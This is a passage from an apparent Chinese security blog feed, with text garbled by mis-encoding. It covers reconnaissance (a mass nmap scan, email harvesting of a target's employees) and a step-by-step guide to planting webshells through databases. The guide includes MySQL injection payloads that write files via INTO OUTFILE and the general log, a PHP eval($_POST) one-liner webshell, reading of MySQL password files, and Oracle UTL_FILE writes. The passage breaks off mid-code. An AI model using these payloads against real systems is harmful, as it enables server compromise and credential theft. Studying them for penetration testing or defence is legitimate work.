ä¸ªç›®å‰æˆ‘ç”¨èµ·æ¥è¿˜ä¸é”™ï¼Œå…¶ä»–çš„ä¸€äº›å­åŸŸåé¡¹ç›®å¥½å¤šéƒ½æ˜¯å‡ å¹´æ²¡æ›´æ–°äº†ï¼Œå®³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shmilylty&#x2F;OneForAll</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;laramies&#x2F;theHarvester</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure><h2 id="ç«¯å£æ”¶é›†"><a href="#ç«¯å£æ”¶é›†" class="headerlink" title="ç«¯å£æ”¶é›†"></a>ç«¯å£æ”¶é›†</h2><p>æ”¶é›†å®Œå­åŸŸåå°±å¯ä»¥æ‰¹é‡æ‰«æä¸€æ³¢ç«¯å£äº†</p><p>å½“éœ€è¦æ‰«æBç«¯ä¹‹ç±»çš„IPçš„æ—¶å€™ï¼Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶<code>ip.txt</code>ç„¶åé‡Œé¢å¡«IPæ®µï¼Œè¿è¡Œä¸‹é¢çš„ä»£ç ç›´æ¥èµ·é£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -Pn -n --min-hostgroup 500 --min-parallelism 2048 --host-timeout 30 -T4 -v -p 20,21,22,23,80,161,389,443,873,1025,1099,2222,2601,2604,3312,3311,4440,5900,5901,5902,7002,9000,9200,10000,50000,50060,50030,8080,139,445,3389,13389,7001,1521,3306,1433,5000,5432,27017,6379,11211,53,389 -iL ip.txt &gt;&gt; result.txt</span><br></pre></td></tr></table></figure><p>æå–æ•°æ®çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;2.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">lines = f.readlines()</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result1 = re.findall(<span class="string">r&#x27;Discovered open port (.*)/tcp&#x27;</span>, line)</span><br><span class="line">        result2 = re.findall(<span class="string">r&#x27;/tcp on (.*)&#x27;</span>, line)</span><br><span class="line">        print(result2[<span class="number">0</span>]+<span class="string">&quot;:&quot;</span>+result1[<span class="number">0</span>])</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">        f2.write(result2[<span class="number">0</span>]+<span class="string">&quot;:&quot;</span>+result1[<span class="number">0</span>]+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;æå–æ•°ï¼š&quot;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure><h2 id="å‘˜å·¥é‚®ç®±æ”¶é›†"><a href="#å‘˜å·¥é‚®ç®±æ”¶é›†" class="headerlink" title="å‘˜å·¥é‚®ç®±æ”¶é›†"></a>å‘˜å·¥é‚®ç®±æ”¶é›†</h2><p>è¿›è¿‡æˆ‘ä»¬ä¸Šé¢çš„ä¸€å¤§æ³¢æ”¶é›†ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“çš„å‰ç½®ä¿¡æ¯</p><ul><li>Cæ®µä¸­å“ªäº›IPçš„å¯¹åº”çš„ç«¯å£æ˜¯é‚®ç®±</li><li>å­åŸŸåæ˜¯é‚®ç®±åœ°å€</li></ul><p>å¦‚æœä»¥ä¸Šæ–¹å¼éƒ½æ²¡æœ‰æ”¶é›†åˆ°æˆ‘ä»¬éœ€è¦çš„é‚®ç®±çš„åœ°å€çš„è¯ï¼Œé‚£æˆ‘ä»¬è¿˜æœ‰åŠæ³•ï¼ˆæ–¹æ³•ä¸å…¨ï¼Œä¸»è¦æ˜¯å› ä¸ºè¿™ä¸ªä¸å¸¸ç”¨</p><h3 id="åˆ©ç”¨ä¸€äº›ç½‘ç«™æ¥æœç´¢"><a href="#åˆ©ç”¨ä¸€äº›ç½‘ç«™æ¥æœç´¢" class="headerlink" title="åˆ©ç”¨ä¸€äº›ç½‘ç«™æ¥æœç´¢"></a>åˆ©ç”¨ä¸€äº›ç½‘ç«™æ¥æœç´¢</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;éƒ¨åˆ†å…è´¹</span><br><span class="line">https:&#x2F;&#x2F;hunter.io</span><br><span class="line">&#x2F;&#x2F;éƒ¨åˆ†å…è´¹</span><br><span class="line">http:&#x2F;&#x2F;www.skymem.info</span><br><span class="line">&#x2F;&#x2F;è¿™ä¸ªç½‘ç«™å…è´¹</span><br><span class="line">https:&#x2F;&#x2F;www.email-format.com&#x2F;i&#x2F;search&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/6.png" alt="image-20200725131737949"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/6.png" alt="image-20200725130658393"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/7.png" alt="image-20200725130959273"></p><p>æ¥ä¸‹æ¥æ˜¯å¼€æºé¡¹ç›®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;laramies&#x2F;theHarvester</span><br></pre></td></tr></table></figure><p>è¿™é¡¹ç›®è¿˜æŒºä¸é”™çš„ï¼Œç›´æ¥è¾“å…¥åŸŸåç„¶åå†™å…¥åˆ°htmlæ–‡ä»¶ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 theHarvester.py -d xxxxx.com -l 2000 -b all -f test.html</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/9.png" alt="image-20200725162758219"></p><h3 id="æŸ¥çœ‹é‚®ç®±æ˜¯å¦å†ç”¨"><a href="#æŸ¥çœ‹é‚®ç®±æ˜¯å¦å†ç”¨" class="headerlink" title="æŸ¥çœ‹é‚®ç®±æ˜¯å¦å†ç”¨"></a>æŸ¥çœ‹é‚®ç®±æ˜¯å¦å†ç”¨</h3><p>æœ‰æ—¶å€™æœ‰å¯èƒ½ç›®æ ‡å‘˜å·¥ç¦»èŒäº†ä¹‹ç±»çš„è¯ï¼Œè¿™ä¸ªé‚®ç®±å¯èƒ½æœ‰ä¸èƒ½ä½¿ç”¨äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªç½‘ç«™æ¥è¿›è¡Œæµ‹è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mailtester.com&#x2F;testmail.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/8.png" alt="image-20200725143449599"></p><p>æˆ–è€…å†™ä¸ªæ‰¹é‡è„šæœ¬æ‰¹é‡è·‘</p><p>å‚è€ƒæ–‡ç« </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.github.com&#x2F;cn&#x2F;github&#x2F;searching-for-information-on-github&#x2F;understanding-the-search-syntax</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzAwMzYxNzc1OA&#x3D;&#x3D;&amp;mid&#x3D;2247483886&amp;idx&#x3D;1&amp;sn&#x3D;4c98836e278737054a2d32416007fa27&amp;chksm&#x3D;9b39275fac4eae490e0c5ca5f90887aa3b8a441f137d18d3b73470ba46577b41ea3a9cfa1342&amp;mpshare&#x3D;1&amp;scene&#x3D;1&amp;srcid&#x3D;0724A6jortzlAN8nrOPDkXZV&amp;sharer_sharetime&#x3D;1595586201150&amp;sharer_shareid&#x3D;de4f8e5a5ad7bd6a89317b77fa1ff085#rd</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>å¸¸è§æ•°æ®åº“å†™å…¥Webshellæ±‡æ€»</title>
    <link href="https://www.ascotbe.com/2020/07/21/DatabaseWriteWebshell/"/>
    <id>https://www.ascotbe.com/2020/07/21/DatabaseWriteWebshell/</id>
    <published>2020-07-21T13:45:42.000Z</published>
    <updated>2021-05-17T00:31:53.721Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>ä¾æ—§æ˜¯ä¹‹å‰é¢è¯•è¢«æ¯’æ‰“çš„é—®é¢˜ï¼Œæ²¡ç©è¿‡å°±ç©ä¸€éå§ï¼Œç›®å‰åªå†™äº†å¸¸è§çš„3ä¸ªæ•°æ®åº“ï¼Œå¦‚æœåé¢åˆé‡åˆ°å…¶ä»–çš„æ•°æ®åº“åœ¨æ·»åŠ ã€‚</p><h2 id="MySqlæ•°æ®åº“"><a href="#MySqlæ•°æ®åº“" class="headerlink" title="MySqlæ•°æ®åº“"></a>MySqlæ•°æ®åº“</h2><p>å‰ææ¡ä»¶</p><ul><li><p>æ•°æ®åº“å½“å‰ç”¨æˆ·ä¸ºrootæƒé™</p></li><li><p>çŸ¥é“å½“å‰ç½‘ç«™çš„ç»å¯¹è·¯å¾„</p></li><li><p>PHPçš„GPCä¸º offçŠ¶æ€</p></li><li><p>å†™å…¥çš„é‚£ä¸ªè·¯å¾„å­˜åœ¨å†™å…¥æƒé™</p></li></ul><p>æ³¨æ„ç‚¹ï¼š</p><blockquote><p>secure_file_privå‚æ•°è¯´æ˜</p></blockquote><p>è¿™ä¸ªå‚æ•°ç”¨æ¥é™åˆ¶æ•°æ®å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œçš„æ•ˆæœï¼Œä¾‹å¦‚æ‰§è¡ŒLOAD DATAã€SELECT â€¦ INTO OUTFILEè¯­å¥å’ŒLOAD_FILE()å‡½æ•°ã€‚</p><ul><li><p>å¦‚æœè¿™ä¸ªå‚æ•°ä¸ºç©ºï¼Œè¿™ä¸ªå˜é‡æ²¡æœ‰æ•ˆæœ</p></li><li><p>å¦‚æœè¿™ä¸ªå‚æ•°è®¾ä¸ºä¸€ä¸ªç›®å½•åï¼ŒMySQLæœåŠ¡åªå…è®¸åœ¨è¿™ä¸ªç›®å½•ä¸­æ‰§è¡Œæ–‡ä»¶çš„å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œã€‚è¿™ä¸ªç›®å½•å¿…é¡»å­˜åœ¨ï¼ŒMySQLæœåŠ¡ä¸ä¼šåˆ›å»ºå®ƒ</p></li><li><p>å¦‚æœè¿™ä¸ªå‚æ•°ä¸ºNULLï¼ŒMySQLæœåŠ¡ä¼šç¦æ­¢å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œã€‚è¿™ä¸ªå‚æ•°åœ¨MySQL 5.7.6ç‰ˆæœ¬å¼•å…¥</p></li></ul><p>å¦‚æœé‡åˆ°ä»¥ä¸‹æƒ…å†µçš„è¯ï¼Œä½¿ç”¨SQLè¯­å¥ä¸­çš„<code>outfile</code>æ˜¯æ— æ³•æˆåŠŸçš„ï¼Œä½†æ˜¯å†™å…¥æ—¥å¿—çš„æ–¹æ³•æ˜¯å¯ä»¥æˆåŠŸçš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/1.png" alt="image-20200721163145745"></p><blockquote><p>å¼€å¯secure_file_priv</p></blockquote><p>ä¿®æ”¹<strong>my.ini</strong>æ–‡ä»¶åéœ€è¦é‡å¯MySql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secure_file_privä¸ºNULLç¦æ­¢å¯¼å‡ºæ–‡ä»¶secure_file_priv&#x3D;&quot;&quot;</span><br><span class="line">secure_file_privæŒ‡å®šåœ°å€é™åˆ¶å¯¼å‡ºåœ°å€åªèƒ½åœ¨æ­¤secure_file_priv&#x3D;â€œD:&#x2F;â€</span><br><span class="line">secure_file_privä¸ºç©ºå¯ä»¥å¯¼å‡ºåˆ°ä»»æ„æ–‡ä»¶secure_file_priv&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/2.png" alt="image-20200721164643432"></p><blockquote><p>æŸ¥çœ‹æ˜¯å¦æœ‰å†™å…¥æƒé™</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(user,0x3a,file_priv) from mysql.user;</span><br><span class="line">å‡ºç°Yï¼Œè¿™å°±ä»£è¡¨ä½ æœ‰æ–‡ä»¶æƒé™ï¼ŒNå°±æ˜¯æ²¡æœ‰</span><br></pre></td></tr></table></figure><h3 id="åŸºäºè”åˆæŸ¥è¯¢"><a href="#åŸºäºè”åˆæŸ¥è¯¢" class="headerlink" title="åŸºäºè”åˆæŸ¥è¯¢"></a>åŸºäºè”åˆæŸ¥è¯¢</h3><p>æ³¨å…¥ç‚¹ä½ç½®å¦‚ä¸‹ï¼Œåé¢ä½¿ç”¨çš„è¯ä¼šçœç•¥è¿™æ®µå€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;Less-2&#x2F;?id&#x3D;1 </span><br></pre></td></tr></table></figure><p>åˆ©ç”¨outfileæ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION ALL SELECT 1,2,&quot;&lt;? phpinfo(); ?&gt;&quot; into outfile &quot;C:\\phpStudy\\PHPTutorial\\WWW\\test\123.txt&quot; -- </span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/3.png" alt="image-20200721182619518"></p><p>å¯ä»¥å‘ç°å†™å…¥æˆåŠŸäº†ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯æˆ‘ä»¬å†™å…¥çš„æ˜¯åœ¨testç›®å½•å’Œ123.txtä¸­é—´æ²¡æœ‰ç”¨åŒæ–œæ ï¼Œè¿™æ ·å†™å…¥çš„æ–‡ä»¶ä¼šè¢«è¿‡æ»¤äº†ï¼Œç›´æ¥å†™åˆ°äº†WWWç›®å½•è€Œä¸æ˜¯testç›®å½•é‡Œé¢</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/4.png" alt="image-20200721182654445"></p><p>åˆ©ç”¨dumpfileæ–¹æ³•ï¼Œè¿™ç§æ–¹æ³•å¯ä»¥å†™å…¥16è¿›åˆ¶æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION ALL SELECT 1,2,&quot;&lt;? phpinfo(); ?&gt;&quot; into dumpfile &quot;C:\\phpStudy\\PHPTutorial\\WWW\\test\123.txt&quot; --</span><br></pre></td></tr></table></figure><p>å†™å…¥æ™®é€šæ•°æ®</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/5.png" alt="image-20200721183121847"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/6.png" alt="image-20200721183134285"></p><p>æŠŠPHPå†…å®¹å†™æˆ16è¿›åˆ¶ç¼–ç æ•°æ®åœ¨å†™å…¥</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/7.png" alt="image-20200721183645338"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/8.png" alt="image-20200721183709153"></p><h3 id="åŸºäºéè”åˆæŸ¥è¯¢"><a href="#åŸºäºéè”åˆæŸ¥è¯¢" class="headerlink" title="åŸºäºéè”åˆæŸ¥è¯¢"></a>åŸºäºéè”åˆæŸ¥è¯¢</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">into outfile &quot;C:\\phpStudy\\PHPTutorial\\WWW\\123.txt&quot; fields terminated by &quot;&lt;? phpinfo(); ?&gt;&quot; %23 --</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/15.png" alt="image-20200722114910448"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/16.png" alt="image-20200722114926885"></p><h3 id="åŸºäºlogæ—¥å¿—å†™shellæ³•"><a href="#åŸºäºlogæ—¥å¿—å†™shellæ³•" class="headerlink" title="åŸºäºlogæ—¥å¿—å†™shellæ³•"></a>åŸºäºlogæ—¥å¿—å†™shellæ³•</h3><p>å…ˆçœ‹çœ‹å½“å‰mysqlä¸‹logæ—¥å¿—çš„é»˜è®¤åœ°å€ï¼ŒåŒæ—¶ä¹Ÿçœ‹ä¸‹logæ—¥å¿—æ˜¯å¦ä¸ºå¼€å¯çŠ¶æ€ï¼Œè®°ä¸‹æ¥åé¢éœ€è¦æ”¹å›æ¥çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/9.png" alt="image-20200721145256729"></p><p>ç„¶åå¼€å¯æ—¥å¿—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; on;</span><br></pre></td></tr></table></figure><p>è®¾ç½®æ—¥å¿—å†™å…¥ä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file &#x3D; &#39;C:&#x2F;2.txt&#39;;</span><br></pre></td></tr></table></figure><p>å†™å…¥æ—¥å¿—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[&#39;ascotbe&#39;]);?&gt;&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/10.png" alt="image-20200721150323748"></p><p>ä¿®æ”¹ä¸ºåŸæ¥çš„è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file&#x3D;&#39;c:&#x2F;xxxxx&#x2F;xxxx&#39;</span><br></pre></td></tr></table></figure><p>å…³é—­æ—¥å¿—è®°å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; off;</span><br></pre></td></tr></table></figure><h3 id="åŸºäºåˆ›å»ºå†å¯¼å‡ºçš„æ–¹æ³•"><a href="#åŸºäºåˆ›å»ºå†å¯¼å‡ºçš„æ–¹æ³•" class="headerlink" title="åŸºäºåˆ›å»ºå†å¯¼å‡ºçš„æ–¹æ³•"></a>åŸºäºåˆ›å»ºå†å¯¼å‡ºçš„æ–¹æ³•</h3><p>è¿æ¥testæ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use test;</span><br></pre></td></tr></table></figure><p>æœç´¢å¹¶åˆ é™¤å­˜åœ¨çš„<strong>ascotbe</strong>è¿™ä¸ªè¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table if exists ascotbe;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºè¿™ä¸ªè¡¨ï¼Œåœ¨é‡Œè¾¹åŠ ä¸ªå­—æ®µxxx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table ascotbe(xxx text not null);</span><br></pre></td></tr></table></figure><p>åœ¨é‡Œé¢å†™å…¥ä¸€å¥è¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into ascotbe(xxx) values (&#39;&lt;?php phpinfo(); ?&gt;&#39;);</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠè¿™å¥è¯å¯¼å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT xxx FROM ascotbe INTO OUTFILE &#39;D:&#x2F;2.txt&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/11.png" alt="image-20200721165110113"></p><p>ç„¶ååˆ é™¤è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE ascotbe;</span><br></pre></td></tr></table></figure><h3 id="ä½æƒé™åˆ©ç”¨"><a href="#ä½æƒé™åˆ©ç”¨" class="headerlink" title="ä½æƒé™åˆ©ç”¨"></a>ä½æƒé™åˆ©ç”¨</h3><p>å¦‚æœä½ å‘ç°ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼Œä½†æ˜¯è¿™ä¸ªæ³¨å…¥ç‚¹åªæ˜¯ä¸€ä¸ªæ™®é€šæƒé™æ²¡æ³•å†™ shell </p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li><p>çŸ¥é“ä¸€ä¸ªæ•°æ®åº“ç”¨æˆ·è´¦å¯†</p></li><li><p>èƒ½è¿›å…¥åˆ° phpmyadmin ä¸‹</p></li><li><p>ä¸€äº›é»˜è®¤æ–‡ä»¶è·¯å¾„ä½ç½®æ²¡æœ‰æ›´æ”¹</p></li></ul><p> é¦–å…ˆæŸ¥çœ‹æ—¥å¿—æ˜¯å¦å¼€å¯ï¼Œç„¶åçœ‹çœ‹æ—¥å¿—æ–‡ä»¶è·¯å¾„æ ¹æ®è¿™ä¸ªè·¯å¾„æ¨ç®—å‡ºé»˜è®¤çš„<strong>user.MYD</strong>è·¯å¾„ã€‚ä¸€èˆ¬é»˜è®¤çš„ä½ç½®éƒ½æ˜¯åœ¨ Mysql\data\mysql\user.MYD è¿™ä¸ªè·¯å¾„ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/12.png" alt="image-20200721170600378"></p><p>ç„¶åæŠŠå¯†ç çš„æ–‡ä»¶å¯¼å…¥åˆ°è¡¨é‡Œé¢ï¼Œè¿™è¾¹æ’å…¥çš„è¡¨ä¸º<strong>ascotbe</strong>ï¼Œè¿™è¾¹æœ‰ä¸ªç‚¹éœ€è¦æ³¨æ„ä¸‹å¯¼å…¥æ–‡ä»¶çš„ä½ç½®éœ€è¦ç”¨<code>\</code>å¯èƒ½ä¼šæŠ¥é”™ï¼Œéœ€è¦æ›¿æ¢æˆ<code>/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA LOCAL INFILE &#39;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;MySQL&#x2F;data&#x2F;mysql&#x2F;user.MYD&#39; INTO TABLE ascotbe FIELDS TERMINATED BY &#39;&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/13.png" alt="image-20200721171534970"></p><p>å¯ä»¥çœ‹åˆ°å¯¼å…¥æˆåŠŸ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/14.png" alt="image-20200721171817802"></p><h2 id="Oracleæ•°æ®åº“"><a href="#Oracleæ•°æ®åº“" class="headerlink" title="Oracleæ•°æ®åº“"></a>Oracleæ•°æ®åº“</h2><p>é¦–å…ˆæ˜¯æ­å»ºç¯å¢ƒï¼Œè¿™è¾¹é€‰ç€dockeræ­å»ºï¼Œæ­å»ºå¥½ç›´æ¥ç”¨navicatè¿æ¥</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/17.png" alt="image-20200722162047188"></p><p>è¿™è¾¹æµ‹è¯•ä½¿ç”¨çš„æ˜¯DBAæƒé™ä¸­çš„systemè´¦æˆ·</p><h3 id="åˆ©ç”¨æ–‡ä»¶è®¿é—®åŒ…å†™shell"><a href="#åˆ©ç”¨æ–‡ä»¶è®¿é—®åŒ…å†™shell" class="headerlink" title="åˆ©ç”¨æ–‡ä»¶è®¿é—®åŒ…å†™shell"></a>åˆ©ç”¨æ–‡ä»¶è®¿é—®åŒ…å†™shell</h3><p>é¦–å…ˆåˆ›å»ºæˆ‘ä»¬å¾—å…ˆå»ºç«‹ä¸€ä¸ªORACLEçš„ç›®å½•å¯¹è±¡æŒ‡å‘<strong>XXXX</strong>ï¼Œè¿™è¾¹æµ‹è¯•æŒ‡å‘çš„è·¯å¾„ä¸º**/home/oracle**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create or replace directory IST0_DIR as &#39;&#x2F;home&#x2F;oracle&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/18.png" alt="image-20200722163209851"></p><p>æˆ‘ä»¬æŸ¥çœ‹dockerçš„è·¯å¾„ï¼Œä»¥åŠè·¯å¾„ä¸‹çš„å†…å®¹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/19.png" alt="image-20200722163036270"></p><p>å¦‚æœåé¢å†™å…¥å¤±è´¥äº†å¯ä»¥æ‰§è¡Œè¿™æ¡å‘½ä»¤å¯¹è¿™ä¸ªç›®å½•è¿›è¡Œæˆæƒä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant read, write on directory IST0_DIR to system;</span><br></pre></td></tr></table></figure><p>ç„¶åå†™å…¥æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">declare</span><br><span class="line">   isto_file utl_file.file_type; --å®šä¹‰å˜é‡çš„ç±»å‹ä¸ºutl_file.file_type</span><br><span class="line">begin</span><br><span class="line">   isto_file :&#x3D; utl_file.fopen(&#39;IST0_DIR&#39;, &#39;ascotbe.jsp&#39;, &#39;W&#39;); --æŒ‡å®šä¸ºIST0_DIR ç›®å½•ä¸‹é¢çš„kj021320.jspæ–‡ä»¶å†™æ“ä½œ</span><br><span class="line">   utl_file.put_line(isto_file, &#39;è¿™æ˜¯ä¸€ä¸ªä¸€å¥è¯webshell&#39;); --å†™å…¥å­—ç¬¦ä¸²</span><br><span class="line">   utl_file.fflush(isto_file); --åˆ·ç¼“å†²</span><br><span class="line">   utl_file.fclose(isto_file); --å…³é—­æ–‡ä»¶æŒ‡é’ˆ</span><br><span 